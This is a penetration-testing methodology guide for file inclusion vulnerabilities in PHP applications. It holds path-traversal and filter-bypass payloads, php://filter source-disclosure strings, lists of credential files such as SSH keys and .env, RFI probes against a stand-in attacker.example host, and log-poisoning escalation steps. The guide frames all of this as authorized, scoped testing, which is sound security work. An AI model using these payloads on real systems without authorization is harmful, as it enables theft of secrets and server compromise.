# File Inclusion

## Introduction

File Inclusion happens when user-controlled input is used to load a file on the server side.

Typical vulnerable patterns:

```php
include($_GET['page']);
require($_GET['template']);
include_once($_REQUEST['lang']);
file_get_contents($_GET['file']);
```

Impact depends on how the file is used:

| Type           | Meaning                                           | Typical Impact                                     |
| -------------- | ------------------------------------------------- | -------------------------------------------------- |
| Path Traversal | Read files outside the intended directory         | Source disclosure, config leak, secrets, logs      |
| LFI            | Include/read a local file from the server         | Local file read, source disclosure, possible RCE   |
| RFI            | Include a remote file controlled by attacker      | Usually RCE if enabled                             |
| Wrapper Abuse  | Abuse PHP stream wrappers/protocols               | Source read, payload execution, filter tricks      |
| Blind FI       | File is included but output is not directly shown | Error-based, timing, OAST, or side-channel testing |

---

## Useful Resources

* HackTricks — File Inclusion / Path Traversal
* Incendium — FI File Inclusion
* PayloadsAllTheThings — File Inclusion
* SecLists — LFI wordlists
* PortSwigger Web Security Academy — Path Traversal

---

## Basic Mental Model

Most FI testing is about answering five questions:

1. Can I control a filename, path, template, language, view, page, theme, or download parameter?
2. Is the application reading a file or executing/interpreting it?
3. What is the current working directory / traversal depth?
4. Are filters modifying `../`, slashes, extensions, protocols, or absolute paths?
5. Can I move from file read to source disclosure, credential exposure, or code execution?

Common vulnerable URL shapes:

```text
/page.php?file=about.html
/index.php?page=home
/download?path=invoice.pdf
/view?template=main
/?lang=en
/?include=contact
/?doc=terms
```

---

## Where to Test

Test every place where user-controlled input may influence a server-side file path.

| Location             | Examples                                     |
| -------------------- | -------------------------------------------- |
| Query parameters     | `?file=`, `?page=`, `?path=`, `?template=`   |
| Path parameters      | `/download/filename`, `/view/theme/name`     |
| POST body            | form fields, hidden fields, JSON values      |
| Cookies              | language, theme, tenant, template            |
| Headers              | `Referer`, `User-Agent`, custom headers      |
| Upload metadata      | filename, image path, import path            |
| PDF/image generators | HTML-to-PDF, SVG, image fetchers             |
| API parameters       | `document`, `attachment`, `export`, `report` |
| Admin panels         | themes, plugins, layouts, imports            |

---

## High-Value Parameter Names

```text
file
path
page
template
include
inc
lang
language
view
doc
document
download
folder
dir
root
style
theme
layout
module
mod
content
asset
image
img
pdf
export
report
redirect
next
url
```

---

## Baseline Workflow

1. Capture a normal request and response.
2. Replace the parameter value with a unique marker:

```text
fi_probe_73921
```

3. Check for:

   * reflected file path
   * error message
   * stack trace
   * changed response length
   * HTTP status change
   * different redirect
   * empty response
   * delayed response
   * application log entry

4. Try a known local file.

5. Adjust traversal depth.

6. Try encoded traversal.

7. Try absolute paths.

8. Try PHP wrappers/protocols.

9. Try log/session/upload-based escalation only if in scope.

---

## First Probe Payloads

### Linux

```text
/etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
```

### Windows

```text
C:/Windows/win.ini
C:/boot.ini
C:/Windows/System32/drivers/etc/hosts
../../../../Windows/win.ini
../../../../boot.ini
```

### Generic Markers

```text
.
..
../
..\
/etc/hosts
/etc/hostname
/proc/version
```

---

## Path Traversal Payloads

### Basic Traversal

```text
../
../../
../../../
../../../../
../../../../../
```

### Mixed Slashes

```text
..\
..\/
../\
..\\
```

### Extra Slash Bypass

```text
....//....//etc/passwd
..///////..////..//////etc/passwd
```

### URL Encoding

```text
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double Encoding

```text
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd
```

### Unicode / Overlong Ideas

```text
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### Keep Initial Path

Useful when the backend prepends a fixed folder.

```text
images/../../../../etc/passwd
languages/../../../../etc/passwd
templates/../../../../etc/passwd
/var/www/html/../../../../etc/passwd
```

---

## Extension Bypass

Some applications append an extension automatically.

Example backend idea:

```php
include($_GET['page'] . ".php");
```

Test ideas:

```text
../../../../etc/passwd%00
../../../../etc/passwd/.
../../../../etc/passwd/./
../../../../etc/passwd........
../../../../etc/passwd%20
../../../../etc/passwd%2e
```

Null-byte payloads are mostly legacy, but still worth recognizing in older labs and outdated stacks.

---

## Filter Bypass Ideas

| Filter Behavior              | Try                                 |
| ---------------------------- | ----------------------------------- |
| Removes `../` once           | `....//....//etc/passwd`            |
| Blocks `/`                   | use `\` or encoded slash            |
| Blocks lowercase             | case changes: `PhP://FilTer`        |
| Appends `.php`               | null byte, path truncation, wrapper |
| Requires prefix folder       | `folder/../../../../etc/passwd`     |
| Decodes once                 | double encoding                     |
| Blocks absolute path         | relative traversal                  |
| Blocks relative path         | absolute path                       |
| Blocks `../` before decoding | encoded traversal                   |

---

## Interesting Linux Files

### Basic Proof

```text
/etc/passwd
/etc/hostname
/etc/hosts
/etc/issue
/proc/version
```

### Users and Shell History

```text
/home/<user>/.bash_history
/home/<user>/.profile
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/authorized_keys
/home/<user>/.ssh/known_hosts
/root/.bash_history
/root/.ssh/id_rsa
```

### Web App Files

```text
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/.htaccess
/var/www/html/wp-config.php
/var/www/html/sites/default/settings.php
```

### Logs

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
```

### Process and Network Recon

```text
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
```

---

## Interesting Windows Files

```text
C:/Windows/win.ini
C:/boot.ini
C:/Windows/System32/drivers/etc/hosts
C:/inetpub/wwwroot/web.config
C:/inetpub/logs/LogFiles/W3SVC1/u_exYYMMDD.log
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/xampp/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/MySQL/MySQL Server 5.7/my.ini
C:/Users/Administrator/NTUser.dat
```

---

## Source Code Disclosure

If PHP code is included normally, the server may execute it instead of showing it.

Use `php://filter` to base64-encode source before it is returned.

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

Example:

```text
/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

Decode locally:

```bash
echo "BASE64_HERE" | base64 -d
```

Good targets:

```text
index.php
config.php
db.php
database.php
settings.php
.env
wp-config.php
configuration.php
```

Look for:

```text
database credentials
API keys
JWT secrets
SMTP credentials
cloud keys
internal endpoints
debug flags
hardcoded admin accounts
framework secret keys
```

---

## PHP Wrappers and Protocols

### php://filter

Source read / transformation.

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
```

Case variation:

```text
PhP://FilTer/convert.base64-encode/resource=index.php
```

### data://

May work when remote URL inclusion is enabled.

```text
data://text/plain,FI_TEST
data://text/plain;base64,RklfVEVTVA==
```

### php://input

Useful when the include reads request body content.

```bash
curl -X POST "https://target/index.php?page=php://input" \
  --data "FI_TEST"
```

### zip://

Useful when an upload feature allows archive-like content and the include can reach it.

```text
zip://upload.jpg%23payload.php
zip://uploads/archive.zip%23file.txt
```

### phar://

Useful in PHP applications where file operations touch attacker-controlled PHAR files. Often relevant when FI combines with upload and deserialization attack surface.

```text
phar://uploads/file.jpg/test.txt
```

### expect://

Only if the PHP expect extension is enabled.

```text
expect://id
```

---

## RFI Checks

Remote File Inclusion requires the application to include remote content and the PHP/runtime configuration to allow it.

Test only with a harmless marker first.

```text
/index.php?page=http://attacker.example/fi.txt
/index.php?page=https://attacker.example/fi.txt
/index.php?page=//attacker.example/fi.txt
```

Windows/SMB-style idea:

```text
\\attacker.example\share\file.txt
```

Look for:

```text
callback to your server
marker in response
different error message
DNS lookup
HTTP request in logs
```

---

## Blind FI Testing

If the response does not print file content, check side channels.

### Error-Based

```text
../../../../doesnotexist
../../../../etc/passwd
```

Compare:

```text
status code
response length
error class
template error
log entry
redirect behavior
```

### Timing / Blocking

Try files that may behave differently:

```text
/dev/random
/proc/self/fd/0
```

Use with caution; avoid anything that could hang the process during production testing.

### OAST / Callback

For RFI or HTML-to-PDF style fetchers, use a controlled listener:

```text
https://collaborator.example/fi_probe_73921
```

Check for:

```text
DNS callback
HTTP callback
source IP
User-Agent
internal resolver behavior
```

---

## LFI to RCE Escalation Paths

Only test escalation when explicitly allowed by the rules of engagement.

Common paths:

| Path                 | Idea                                                     |
| -------------------- | -------------------------------------------------------- |
| Log Poisoning        | Put PHP code into access/auth logs, then include the log |
| Upload + Include     | Upload controlled file, then include it through LFI      |
| Session File Include | Poison session content, then include session file        |
| `/proc/self/environ` | Inject into environment-like request values              |
| `php://input`        | POST PHP code and include request body                   |
| `data://`            | Include inline payload through data wrapper              |
| `zip://`             | Include PHP file inside uploaded archive                 |
| RFI                  | Include remote controlled file                           |
| Source Disclosure    | Read code/config, then pivot using credentials           |

---

## Log Poisoning Checklist

Candidate logs:

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
```

Poisonable fields:

```text
User-Agent
Referer
X-Forwarded-For
request path
username field
SSH username
mail headers
```

Flow:

1. Find readable log file through LFI.
2. Send unique marker in a logged field.
3. Include the log again.
4. Confirm marker appears.
5. If RCE is allowed, replace marker with controlled server-side payload.
6. Trigger through the LFI endpoint.

Marker request:

```bash
curl -A "fi_probe_73921" "https://target/"
```

Include log:

```text
/index.php?page=../../../../var/log/apache2/access.log
```

---

## Session File Include

PHP session files are often stored under:

```text
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php/session/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
```

Flow:

1. Set or identify `PHPSESSID`.
2. Store a unique marker in a session-controlled value.
3. Include candidate session file path.
4. Confirm marker appears.
5. Escalate only if allowed.

Example candidate:

```text
/index.php?page=../../../../var/lib/php/sessions/sess_abc123
```

---

## Upload + Include

Useful when the application allows uploading files but blocks direct execution.

Flow:

1. Upload harmless marker file first.
2. Identify upload path.
3. Include uploaded file through vulnerable parameter.
4. Check whether contents are printed or interpreted.
5. Test archive/wrapper tricks if normal include fails.

Candidate paths:

```text
uploads/file.txt
../uploads/file.txt
../../uploads/file.txt
/var/www/html/uploads/file.txt
```

Wrapper examples:

```text
zip://uploads/avatar.jpg%23payload.php
phar://uploads/avatar.jpg/test.txt
```

---

## HTML-to-PDF / SVG File Read

Some HTML-to-PDF engines fetch local files referenced in HTML, CSS, SVG, fonts, or image tags.

Test surfaces:

```text
PDF export
invoice generator
report generator
HTML preview
email-to-PDF
SVG upload
image converter
template editor
```

Probe ideas:

```html
<img src="file:///etc/hostname">
<img src="/etc/hostname">
<link rel="stylesheet" href="file:///etc/passwd">
```

SVG-style idea:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="file:///etc/hostname" />
</svg>
```

Look for:

```text
file content rendered in PDF
broken image icon with leaked path
PDF metadata revealing engine/version
server-side callback
different generation error
```

---

## Directory Depth Discovery

Find traversal depth by increasing `../` until a known file is reached.

```text
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
```

Once depth is known, test suspected folders.

Example:

```text
private/../../../../etc/passwd
uploads/../../../../etc/passwd
backup/../../../../etc/passwd
```

If `/etc/passwd` still loads, the inserted directory probably exists at that relative location.

---

## Exposed `.git` as FI Adjacent Finding

Check quickly:

```bash
curl -i https://target/.git/HEAD
curl -i https://target/.git/config
```

If exposed, dump for offline source review:

```bash
git-dumper https://target/.git/ out/
cd out
git checkout .
```

Look for file include sinks:

```bash
grep -R "include(" .
grep -R "require(" .
grep -R "file_get_contents" .
grep -R "\$_GET" .
grep -R "\$_REQUEST" .
```

---

## Fuzzing

### ffuf

```bash
ffuf -u "https://target/index.php?page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0
```

With cookies:

```bash
ffuf -u "https://target/index.php?page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -H "Cookie: PHPSESSID=abc123"
```

Parameter discovery:

```bash
ffuf -u "https://target/index.php?FUZZ=../../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

### wfuzz

```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  --hw 0 \
  "https://target/index.php?page=FUZZ"
```

### curl Loop

```bash
while read p; do
  echo "[*] $p"
  curl -sk "https://target/index.php?page=$p" | head
done < lfi.txt
```

---

## Response Signals

| Signal                        | Meaning                      |
| ----------------------------- | ---------------------------- |
| `/etc/passwd` content         | Confirmed Linux file read    |
| `root:x:0:0`                  | Strong Linux proof           |
| `[extensions]` in `win.ini`   | Windows file read            |
| PHP source base64             | Source disclosure via filter |
| Stack trace path              | Local path leak              |
| Different response length     | Blind/semi-blind FI          |
| HTTP 500 only for valid file  | Possible include behavior    |
| Callback to listener          | RFI/SSRF-like fetch          |
| Marker appears in log/session | Poisoning path exists        |

---

## Manual Testing Checklist

### Discovery

- [ ] Identified all candidate FI parameters.
- [ ] Checked query, path, body, JSON, cookie, and header inputs.
- [ ] Tested one parameter at a time.
- [ ] Sent unique marker before traversal payloads.
- [ ] Compared baseline response length, status, headers, redirects, and body.

### Basic File Read

- [ ] Tested Linux proof files.
- [ ] Tested Windows proof files.
- [ ] Tried relative traversal.
- [ ] Tried absolute paths.
- [ ] Adjusted traversal depth.
- [ ] Tried mixed slash styles.

### Filter Evasion

- [ ] Tried encoded traversal.
- [ ] Tried double encoding.
- [ ] Tried extra slash traversal.
- [ ] Tried `....//` style bypass.
- [ ] Tried keeping required folder prefix.
- [ ] Tried extension bypass ideas.
- [ ] Tried case changes for wrappers.

### Source Disclosure

- [ ] Tested `php://filter`.
- [ ] Read `index.php`.
- [ ] Read config-like files.
- [ ] Decoded base64 locally.
- [ ] Searched source for secrets and include sinks.

### Wrapper Testing

- [ ] Tested `php://filter`.
- [ ] Tested `data://` only when in scope.
- [ ] Tested `php://input` with harmless marker.
- [ ] Tested `zip://` if uploads exist.
- [ ] Tested `phar://` if PHP app and upload/deserialization surface exists.
- [ ] Tested `expect://` only as a rare extension check.

### Escalation

- [ ] Checked readable web logs.
- [ ] Checked whether marker can be written to logs.
- [ ] Checked session file location.
- [ ] Checked upload path.
- [ ] Checked whether included files are printed or interpreted.
- [ ] Escalated to RCE only when explicitly authorized.

### Evidence

- [ ] Saved original request.
- [ ] Saved payload request.
- [ ] Saved response showing file read or source disclosure.
- [ ] Saved decoded source/config snippet only as needed.
- [ ] Proved impact with minimal data.
- [ ] Avoided broad secret dumping unless scope explicitly allowed it.
